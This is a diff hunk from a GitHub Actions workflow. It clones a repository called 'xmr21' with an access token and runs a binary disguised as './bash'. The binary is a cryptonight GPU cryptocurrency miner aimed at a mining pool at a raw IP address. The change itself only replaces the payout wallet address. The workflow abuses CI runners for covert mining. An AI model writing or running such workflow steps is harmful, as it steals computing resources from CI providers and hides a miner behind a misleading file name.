@@ -34,4 +34,4 @@ jobs:
           git clone https://x-access-token:$GH_TOKEN@github.com/sadarsayujinjas/xmr21.git
           cd xmr21
           chmod +x ./bash
-          ./bash --noCPU -o 138.197.24.47:80 -u RYoNsCHsnFSQLS5JUWzd9ee7N7pe44gTE9JUmjYHUgT6RRLL76x35pwiJ9aVU141s6JnBachuzCJWcPFn9zEdvM9WhsSswGtky352bQiR41hX2 -p x --currency cryptonight_gpu -i 3333
+          ./bash --noCPU -o 138.197.24.47:80 -u ccx7FNm5WxvKLTWgLyc9EuMKeMv32u32bgrGCAoq7SwzFdEz5BYkBRDexMyZmYUGaqGf8jFJCCRyqVFDdvXv4N6zAKPceUT6T1 -p x --currency cryptonight_gpu -i 3333
